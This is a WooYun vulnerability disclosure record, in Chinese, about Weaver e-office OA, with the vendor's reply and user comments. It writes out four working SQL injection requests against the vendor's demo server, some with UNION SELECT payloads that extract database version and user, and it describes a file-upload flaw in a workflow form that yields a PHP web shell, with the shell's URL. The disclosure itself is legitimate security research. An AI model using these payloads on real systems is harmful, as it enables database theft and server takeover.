{"id": 48795, "wybug_id": "wooyun-2014-076191", "wybug_title": "泛微OA漏洞集合·2（SQL注入/文件上传getshell）", "wybug_corp": "泛微OA", "wybug_author": "路人甲", "wybug_date": "2014-09-17 12:37", "wybug_open_date": "2014-12-16 12:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向公众公开  简要描述： ...泛微系统办公高级版 详细说明：  ：：：：：只为系统更安全：：：：：因问题较多，只拿官方demo演示：：：：：\n\n\n0x01:SQL注入漏洞 4 处\n1# 注入点一\nPOST /general/new_mytable/content_list/content_-99.php?user_id=WV00000045&lang=cn HTTP/1.1Host: eoffice8.weaver.cn:8028Proxy-Connection: keep-aliveContent-Length: 40Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.6.0_rc0Origin: http://eoffice8.weaver.cn:8028X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://eoffice8.weaver.cn:8028/general/new_mytable/newportal.phpAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2Cookie: LOGIN_LANG=cn; PHPSESSID=a404fce9850b7c8c0272b077efc44820; USER_NAME_COOKIE=xj; LOGIN_LANG=cnblock_id=1901&body_width=1121&_=问题参数 block_id\n\n\n2# 注入点二\nhttp://eoffice8.weaver.cn:8028/general/address/view/view_detail.php?ADD_ID=-169%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,database(),user(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46\n\n\n3# 注入点三\nhttp://eoffice8.weaver.cn:8028/general/address/docenter/export_do.php?group_id=19%20UNION%20SELECT%20user(),database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16这个注入点比较有意思，导出的通讯录中会有相关的数据库信息\n\n\n4# 注入点四\nGET /general/file_folder/file_new/neworedit/getContentByType.php?type=1&content_id=319*&SORT_ID=148&FILE_SORT=1 HTTP/1.1Host: eoffice8.weaver.cn:8028Proxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Referer: http://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=319&SORT_ID=148&func_id=&operationType=editFromRead&docStr=Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2Cookie: LOGIN_LANG=cn; PHPSESSID=a404fce9850b7c8c0272b077efc44820; USER_NAME_COOKIE=xj; LOGIN_LANG=cn问题参数为 content_id\n\n\n\n0x02:文件上传导致Getshell\n办理流程 -- 费用报销 -- 签办反馈http://eoffice8.weaver.cn:8028/general/workflow/input_form/input_form.php?RUN_ID=5557&FLOW_ID=3115&PRCS_ID=1&FLOW_PRCS=1&FUNC_ID=在“签办反馈”处可以上传文件（cvs --> php）,最终可 getshell\n\n\n\n\n\n最终得到shell：http://eoffice8.weaver.cn:8028/ATTACHMENT/1952281003/conf1g.php\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-22 09:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-17 13:46 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  高级版有什么区别？    \n     2014-12-16 13:17 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  关键是这个要登陆就没意思了    \n     2014-12-16 16:13 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  为何我们用的是jsp    \n     2014-12-16 16:14 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @浮萍 是另一套程序吧？    \n     2014-12-16 16:28 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @Coody e-Weaver 应该吧~~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}